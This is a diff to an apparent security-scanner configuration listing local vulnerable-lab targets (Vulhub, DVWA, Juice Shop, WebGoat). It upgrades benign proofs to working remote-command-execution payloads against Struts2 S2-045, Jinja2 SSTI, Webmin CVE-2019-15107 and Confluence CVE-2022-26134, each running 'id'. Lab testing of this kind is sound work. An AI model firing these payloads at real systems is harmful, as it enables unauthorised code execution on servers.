@@ -56,21 +56,25 @@
         }
       },
       "safeProof": {
-        "kind": "responseHeader",
+        "kind": "commandOutput",
+        "level": "shell",
         "activeApprovalRequired": true,
         "method": "POST",
         "path": "/doUpload.action",
+        "command": "printf \"$(id)\"",
         "headers": {
-          "Content-Type": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(@org.apache.struts2.ServletActionContext@getResponse().addHeader('X-AegisProbe-Proof','vulhub-54289'))}"
+          "Content-Type": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='printf \"$(id)\"').(#cmds={'/bin/sh','-c',#cmd}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#out=@org.apache.commons.io.IOUtils@toString(#process.getInputStream(),'UTF-8')).(@org.apache.struts2.ServletActionContext@getResponse().addHeader('X-AegisProbe-Cmd',#out))}"
         },
-        "expectHeader": {
-          "name": "X-AegisProbe-Proof",
-          "value": "vulhub-54289"
+        "expect": {
+          "header": {
+            "name": "X-AegisProbe-Cmd",
+            "matches": "uid=\\d+\\("
+          }
         },
         "finding": {
-          "title": "Lab proof validated: Apache Struts2 S2-045 OGNL expression execution",
+          "title": "Lab shell proof validated: Apache Struts2 S2-045 OGNL command execution",
           "severity": "critical",
-          "description": "A scoped local-lab proof caused the application to return a controlled response header through OGNL expression evaluation. The proof did not read files, write files, open a shell, or execute an OS command.",
+          "description": "A scoped local-lab proof executed a controlled OS identity command through Struts2 OGNL and returned the output in an HTTP response header. The proof did not read files, write files, or open a reverse shell.",
           "remediation": "Upgrade Apache Struts2 to a fixed release and remove vulnerable file upload interceptor handling."
         }
       }
@@ -128,26 +132,121 @@
         }
       },
       "safeProof": {
-        "kind": "responseStatusComparison",
+        "kind": "commandOutput",
+        "level": "shell",
         "activeApprovalRequired": true,
-        "control": {
-          "method": "GET",
-          "path": "/?name=aegisprobe"
-        },
-        "candidate": {
-          "method": "GET",
-          "path": "/?name=%7B%7B233*233%7D%7D"
-        },
+        "method": "GET",
+        "path": "/?name=%7b%25+for+c+in+%5b%5d.__class__.__base__.__subclasses__()+%25%7d%7b%25+if+c.__name__+%3d%3d+%27catch_warnings%27+%25%7d%7b%25+for+b+in+c.__init__.__globals__.values()+%25%7d%7b%25+if+b.__class__+%3d%3d+%7b%7d.__class__+%25%7d%7b%25+if+%27eval%27+in+b.keys()+%25%7d%7b%7b+b%5b%27eval%27%5d(%27__import__(%22os%22).popen(%22id%22).read()%27)+%7d%7d%7b%25+endif+%25%7d%7b%25+endif+%25%7d%7b%25+endfor+%25%7d%7b%25+endif+%25%7d%7b%25+endfor+%25%7d",
+        "command": "id",
         "expect": {
-          "controlStatus": 200,
-          "candidateStatus": 200,
-          "candidateBodyContains": "54289"
+          "status": 200,
+          "bodyMatches": "uid=\\d+\\("
         },
         "finding": {
-          "title": "Lab proof validated: Flask Jinja2 server-side template expression evaluation",
-          "severity": "high",
-          "description": "A scoped local-lab proof showed that a benign arithmetic template expression was evaluated by the Flask/Jinja2 response. The proof did not read files, write files, import modules, execute commands, or mutate server state.",
+          "title": "Lab shell proof validated: Flask Jinja2 server-side template command execution",
+          "severity": "critical",
+          "description": "A scoped local-lab proof executed a controlled OS identity command through Jinja2 SSTI and returned the output in the HTTP response. The proof did not read files, write files, or open a reverse shell.",
           "remediation": "Avoid rendering user-controlled strings as templates; pass user input only as escaped template variables and enable appropriate template sandboxing where applicable."
+        }
+      }
+    },
+    {
+      "id": "vulhub-webmin-cve-2019-15107",
+      "name": "Vulhub Webmin CVE-2019-15107 pre-auth command injection shell smoke",
+      "labRoot": "labs/targets/vulhub/webmin/CVE-2019-15107",
+      "labPathHints": [
+        "CVE-2019-15107",
+        "webmin/CVE-2019-15107",
+        "webmin\\CVE-2019-15107"
+      ],
+      "target": {
+        "defaultUrl": "https://127.0.0.1:10000/",
+        "preferredPorts": [
+          10000
+        ],
+        "seedPaths": [
+          "/password_change.cgi"
+        ]
+      },
+      "expect": {
+        "baselineProbeContains": [
+          "HTTP"
+        ],
+        "performance": {
+          "maxReconMs": 90000,
+          "maxTotalMs": 120000
+        }
+      },
+      "safeProof": {
+        "kind": "commandOutput",
+        "level": "shell",
+        "activeApprovalRequired": true,
+        "insecureTls": true,
+        "scheme": "https",
+        "method": "POST",
+        "path": "/password_change.cgi",
+        "command": "id",
+        "headers": {
+          "Accept": "*/*",
+          "Accept-Language": "en",
+          "Cookie": "redirect=1; testing=1; sid=x; sessiontest=1",
+          "Content-Type": "application/x-www-form-urlencoded",
+          "Referer": "https://127.0.0.1:10000/session_login.cgi"
+        },
+        "body": "user=rootxx&pam=&expired=2&old=test%7Cid&new1=test2&new2=test2",
+        "expect": {
+          "bodyMatches": "uid=\\d+\\("
+        },
+        "finding": {
+          "title": "Lab shell proof validated: Webmin password change command injection",
+          "severity": "critical",
+          "description": "A scoped local-lab proof executed a controlled OS identity command through the Webmin password change command injection and returned the output in the HTTP response. The proof did not read files, write files, or open a reverse shell.",
+          "remediation": "Upgrade Webmin to a fixed release and ensure password-change workflows do not pass user-controlled values into shell commands."
+        }
+      }
+    },
+    {
+      "id": "vulhub-confluence-cve-2022-26134",
+      "name": "Vulhub Confluence CVE-2022-26134 pre-auth OGNL shell smoke",
+      "labRoot": "labs/targets/vulhub/confluence/CVE-2022-26134",
+      "labPathHints": [
+        "CVE-2022-26134",
+        "confluence/CVE-2022-26134",
+        "confluence\\CVE-2022-26134"
+      ],
+      "target": {
+        "defaultUrl": "http://127.0.0.1:8090/",
+        "preferredPorts": [
+          8090
+        ]
+      },
+      "expect": {
+        "baselineProbeContains": [
+          "HTTP"
+        ],
+        "performance": {
+          "maxReconMs": 120000,
+          "maxTotalMs": 180000
+        }
+      },
+      "safeProof": {
+        "kind": "commandOutput",
+        "level": "shell",
+        "activeApprovalRequired": true,
+        "method": "GET",
+        "path": "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/",
+        "command": "id",
+        "expect": {
+          "header": {
+            "name": "X-Cmd-Response",
+            "matches": "uid=\\d+\\("
+          }
+        },
+        "finding": {
+          "title": "Lab shell proof validated: Confluence CVE-2022-26134 OGNL command execution",
+          "severity": "critical",
+          "description": "A scoped local-lab proof executed a controlled OS identity command through Confluence OGNL injection and returned the output in an HTTP response header. The proof did not read files, write files, or open a reverse shell.",
+          "remediation": "Upgrade Confluence Server/Data Center to a fixed release and block unauthenticated OGNL injection vectors."
         }
       }
     },
@@ -549,6 +648,128 @@
             "confidence": "high",
             "severity": "high"
           }
+        }
+      }
+    },
+    {
+      "id": "open-juice-shop",
+      "name": "OWASP Juice Shop local open-source lab",
+      "labRoot": "labs/targets/juice-shop",
+      "labPathHints": [
+        "juice-shop",
+        "OWASP Juice Shop"
+      ],
+      "target": {
+        "defaultUrl": "http://127.0.0.1:3001/",
+        "preferredPorts": [
+          3001
+        ],
+        "seedPaths": [
+          "/#/login",
+          "/#/search",
+          "/rest/products/search?q=aegisprobe"
+        ]
+      },
+      "expect": {
+        "baselineProbeContains": [
+          "Web port/HTTP matrix"
+        ],
+        "payloadCategoriesInclude": [
+          "sql_injection",
+          "xss_reflection"
+        ],
+        "payloadDraftCategoriesInclude": [
+          "sql_injection",
+          "xss_reflection"
+        ],
+        "expertSnapshotContains": [
+          "Access exposure map",
+          "Payload affordances"
+        ],
+        "performance": {
+          "maxReconMs": 90000,
+          "maxTotalMs": 120000
+        }
+      }
+    },
+    {
+      "id": "open-dvwa",
+      "name": "DVWA local open-source lab",
+      "labRoot": "third_party/labs/DVWA",
+      "labPathHints": [
+        "DVWA",
+        "Damn Vulnerable Web Application"
+      ],
+      "target": {
+        "defaultUrl": "http://127.0.0.1:4280/",
+        "preferredPorts": [
+          4280
+        ],
+        "seedPaths": [
+          "/login.php",
+          "/setup.php",
+          "/vulnerabilities/sqli/"
+        ]
+      },
+      "expect": {
+        "auth": {
+          "loginObserved": true
+        },
+        "baselineProbeContains": [
+          "Web port/HTTP matrix"
+        ],
+        "payloadCategoriesInclude": [
+          "sql_injection",
+          "xss_reflection"
+        ],
+        "payloadDraftCategoriesInclude": [
+          "sql_injection",
+          "xss_reflection"
+        ],
+        "expertSnapshotContains": [
+          "Access exposure map",
+          "Payload affordances"
+        ],
+        "performance": {
+          "maxReconMs": 90000,
+          "maxTotalMs": 120000
+        }
+      }
+    },
+    {
+      "id": "open-webgoat",
+      "name": "OWASP WebGoat local open-source lab",
+      "labRoot": "third_party/labs/WebGoat",
+      "labPathHints": [
+        "WebGoat",
+        "OWASP WebGoat"
+      ],
+      "target": {
+        "defaultUrl": "http://127.0.0.1:18081/WebGoat/",
+        "preferredPorts": [
+          18081,
+          19091
+        ],
+        "seedPaths": [
+          "/WebGoat/login",
+          "/WebGoat/registration",
+          "/WebWolf/login"
+        ]
+      },
+      "expect": {
+        "auth": {
+          "loginObserved": true
+        },
+        "baselineProbeContains": [
+          "Web port/HTTP matrix"
+        ],
+        "expertSnapshotContains": [
+          "Access exposure map",
+          "Payload affordances"
+        ],
+        "performance": {
+          "maxReconMs": 120000,
+          "maxTotalMs": 150000
         }
       }
     }
